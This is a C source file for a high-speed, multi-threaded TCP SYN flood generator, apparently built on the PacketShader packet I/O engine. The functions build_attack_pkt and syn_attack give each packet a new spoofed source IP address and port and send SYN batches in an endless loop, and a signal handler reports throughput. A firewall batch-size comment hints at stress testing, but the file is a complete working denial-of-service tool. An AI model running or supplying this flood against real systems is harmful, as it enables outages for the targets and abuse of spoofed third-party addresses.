#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#define __USE_GNU

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sched.h>
#include <unistd.h>
#include <assert.h>
#include <errno.h>
#include <string.h>
#include <pthread.h>

#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netinet/ip6.h>
#include <arpa/inet.h>


#include <sys/wait.h>
#include "pkt_buff.h"
#include <numa.h>
#include <sys/time.h>

#include "../../include/psio.h"

#define CHUNK_RX_TEST

#define PS_MAX_CPUS 32
//#define DEBUG
#define TIMECALCULATE
#define FW_IO_BATCH_NUM 512	//firewall config->io_batch_num : 512
#define MAX_THREAD_NUM 12

int num_devices;
struct ps_device devices[PS_MAX_DEVICES];

int num_devices_attached;
int devices_attached[PS_MAX_DEVICES];

struct ps_handle handles[PS_MAX_CPUS];

static uint32_t thread_num = 6;
static int chunk_size;

struct worker{
	struct ps_queue *queue;
	int thrd_id;
	struct timeval *endtime;
	struct timeval *startime;
	uint64_t gen_ip;
};

struct worker *workers;

int get_cpu_nums()
{
	return sysconf(_SC_NPROCESSORS_ONLN);
}


void  bind_cpu_thread(int cpu)
{
	cpu_set_t *cmask;
	struct bitmask *bmask;
	size_t ncpu, setsize;
	int ret;    

	ncpu = get_cpu_nums();

	printf("bind cpu : %d\n",cpu);

	if (cpu < 0 || cpu >= (int)ncpu) {
		errno = -EINVAL;
		pthread_exit(NULL);
	}   

	cmask = CPU_ALLOC(ncpu);
	if (cmask == NULL) {
		pthread_exit(NULL);
	}   
	setsize = CPU_ALLOC_SIZE(ncpu); 
	CPU_ZERO_S(setsize, cmask);
	CPU_SET_S(cpu, setsize, cmask);

	ret = pthread_setaffinity_np(pthread_self(), setsize, cmask) ; //setsize,not ncpu

	CPU_FREE(cmask);

	if(ret!=0) pthread_exit(NULL);

	/* skip NUMA stuff for UMA systems */
	if (numa_max_node() != 0) {                                                                                                

		bmask = numa_bitmask_alloc(16);

		if(bmask==0) pthread_exit(NULL);

		numa_bitmask_setbit(bmask, cpu % 2); 
		numa_set_membind(bmask);
		numa_bitmask_free(bmask);
	}   
}


void print_usage(char *argv0)
{
	fprintf(stderr, "Usage: %s <interface to echo> <...>",
			argv0);

	exit(2);
}

void parse_opt(int argc, char **argv)
{
	int i, j;

	if (argc < 2)
		print_usage(argv[0]);

	for (i = 1; i < argc; i++) {
		int ifindex = -1;

		for (j = 0; j < num_devices; j++) {
			if (strcmp(argv[i], devices[j].name) != 0)
				continue;

			ifindex = devices[j].ifindex;
			break;
		}

		if (ifindex == -1) {
			fprintf(stderr, "Interface %s does not exist!\n", argv[i]);
			exit(4);
		}

		for (j = 0; j < num_devices_attached; j++) {
			if (devices_attached[j] == ifindex)
				goto already_attached;
		}

		devices_attached[num_devices_attached] = ifindex;
		num_devices_attached++;
        printf("ifindex = %d\n", ifindex);

already_attached:
		;
	}

	assert(num_devices_attached > 0);
}


void handle_signal(int signal)
{
	struct ps_handle *handle;

	uint64_t total_tx_packets = 0;
	uint64_t total_tx_bytes = 0;

	int i;
	int ifindex;
	
	int pktlen = 74;
	struct timeval subtime[thread_num];

	for(i = 0; i < thread_num; i ++){
		gettimeofday(workers[i].endtime, NULL);
		timersub(workers[i].endtime, workers[i].startime, &subtime[i]);
	}

	assert (num_devices_attached == 1);
#if 0
	for (i = 0; i < num_devices_attached; i++) {
		ifindex = devices_attached[i];
		total_tx_packets += handle->tx_packets[ifindex];
		total_tx_bytes += handle->tx_bytes[ifindex];
	}
#endif

	ifindex = devices_attached[0];
	int j;
	for(j = 0; j < thread_num; j ++){

		handle = &handles[j];
		total_tx_packets = handle->tx_packets[ifindex];
		total_tx_bytes = handle->tx_bytes[ifindex];
		printf("pkts: %lu, bytes: %lu, snd: %lu, usnd: %lu\n", total_tx_packets, total_tx_bytes, subtime[j].tv_sec, subtime[j].tv_usec);
		printf("----------\n");
		printf("CPU %d: %ld packets transmitted, elapse time : %lds, Send Speed : %lf Mpps, %5.2f Gbps, Aveage Len. = %ld\n", 
				j, total_tx_packets, subtime[j].tv_sec, 
				(double)(total_tx_packets) / (double) (subtime[j].tv_sec * 1000000 + subtime[j].tv_usec),
				(double)(total_tx_packets * pktlen * 8) / 
				(double) ((subtime[j].tv_sec * 1000000 + subtime[j].tv_usec) * 1000),
				total_tx_bytes/total_tx_packets);

		for (i = 0; i < num_devices_attached; i++) {
			char *dev = devices[devices_attached[i]].name;
			ifindex = devices_attached[i];

			if (handle->tx_packets[ifindex] == 0)
				continue;

			printf("  %s: ", dev);

			printf("TX %ld packets "
					"(%ld chunks, %.2f packets per chunk)\n", 
					handle->tx_packets[ifindex],
					handle->tx_chunks[ifindex],
					handle->tx_packets[ifindex] / 
					(double)handle->tx_chunks[ifindex]);
		}
	}

	exit(0);
}


void loadpkt(u_char **pktdata, int *pktlen)
{
	file_cache_t *fct;
	int file_no = 0;
	unsigned int tmp_pktlen;

	if((fct = preload_pcap_file(file_no)) != NULL) {
		printf("Loading done, file %d\n", file_no);
		if (!check_pcap(fct))
			printf("It is not trace file, core \n");
	} 
	else {
		printf("Loading failed, file %d\n", file_no);
	}

	*pktdata = prep_next_skb(fct, &tmp_pktlen);
	*pktlen = tmp_pktlen;    //the actual pkt length.
}


//===================attack========================//
void build_attack_pkt(struct ps_chunk *chunk, struct worker *w_m)
{
	assert(chunk);
	char *ip;
	int i;
	for(i =0; i < chunk->cnt; i ++){
		ip = chunk->buf + chunk->info[i].offset + 26;     //saddr
		*(uint32_t *)ip = htonl((uint32_t)(w_m->gen_ip >> 16));
		ip = chunk->buf + chunk->info[i].offset + 34;      //src port
		*(uint16_t *)ip = htons((uint16_t)(w_m->gen_ip & 0xFFFF));
		w_m->gen_ip ++;
	}
}

/* just send, don't call ps_attach_rx_device()*/
void* syn_attack(void *worker_m)
{

	struct ps_queue *queue = ((struct worker*)worker_m)->queue;
	int thrd =((struct worker*)worker_m)->thrd_id;	//thrd_id = qidx -1 = core -1, use handles[thrd] 
	int cpu_id = thrd + 1;
	struct timeval *startime = ((struct worker*)worker_m)->startime;

	bind_cpu_thread(cpu_id);

	struct ps_handle *handle = &handles[thrd];

	struct ps_chunk chunk;   //chunk: snd & recv , syn_chunk: snd
	u_char *pktdata;
	int pktlen;

	loadpkt(&pktdata, &pktlen);

	int i;

	assert(ps_init_handle(handle) == 0);
	assert(ps_alloc_chunk(handle, &chunk) == 0);
	chunk.recv_blocking = 0;

	chunk.queue.ifindex = queue->ifindex;
	chunk.queue.qidx = queue->qidx;
	
	//int size = 512;
	//printf("input chunk.cnt : ");
	//scanf("%d", &size);
	//chunk.cnt = FW_IO_BATCH_NUM;	//speed item
	chunk.cnt = chunk_size;
	int size_m = chunk_size;

	struct ethhdr *ethh;
	struct iphdr *iph;
	struct tcphdr *tcph;
	ethh = (struct ethhdr *)pktdata;
	iph = (struct iphdr *)(ethh + 1);
	tcph = (struct tcphdr *)(pktdata + sizeof(struct ethhdr) + 4 * iph->ihl);
	tcph->syn = 1;
	tcph->ack = 0;
	tcph->psh = 0;
	tcph->rst = 0;

	tcph->seq = 0;

	for(i = 0; i < size_m; i ++){
		chunk.info[i].offset = i * PS_ALIGN(pktlen, 64);
		chunk.info[i].len = pktlen;   
		memcpy(chunk.buf + chunk.info[i].offset, pktdata, pktlen);
	}

	gettimeofday(startime, NULL);

	double time = (double)(startime->tv_sec + startime->tv_usec / 1000000);
	printf("worker %d : attack time %lf\n", thrd, time);
	
	while(1){
		build_attack_pkt(&chunk, (struct worker*)worker_m);
		ps_send_chunk(handle, &chunk);
	}

	pthread_exit(NULL);
}

int main(int argc, char **argv)
{
	int num_cpus = get_cpu_nums();
	assert(num_cpus >= 1);

	num_devices = ps_list_devices(devices);
	if (num_devices == -1) {
		perror("ps_list_devices");
		exit(1);
	}
	parse_opt(argc, argv);

	workers = (struct worker *)malloc(sizeof(struct worker) * thread_num);
	pthread_t threads[thread_num];

	printf("input chunk.cnt: ");
	scanf("%d", &chunk_size);
	printf("\n");

	int ifindex = devices_attached[0];	//use this nic
	
	// tx and cores: 2,1, thrd: 1,0
	int i;
	for(i = 0; i < thread_num; i ++){
		workers[i].queue = (struct ps_queue *)malloc(sizeof(struct ps_queue));
		workers[i].startime = (struct timeval *)malloc(sizeof(struct timeval));
		workers[i].endtime = (struct timeval *)malloc(sizeof(struct timeval));
	}
	
	signal(SIGINT, handle_signal);

	for(i = 0; i < thread_num; i ++){
		workers[i].queue->ifindex = ifindex;
		workers[i].queue->qidx = i + 1;
		workers[i].thrd_id = i;
		workers[i].gen_ip = 0x100000 * (9 + i) + 1;	
		pthread_create(&threads[i], NULL, &syn_attack, &workers[i]);
	}

//main thread continue......
	for(i = 0; i < thread_num; i ++){
		printf("thread is %d\n", i);
		pthread_join(threads[i], NULL);
	}

	return 0;
}
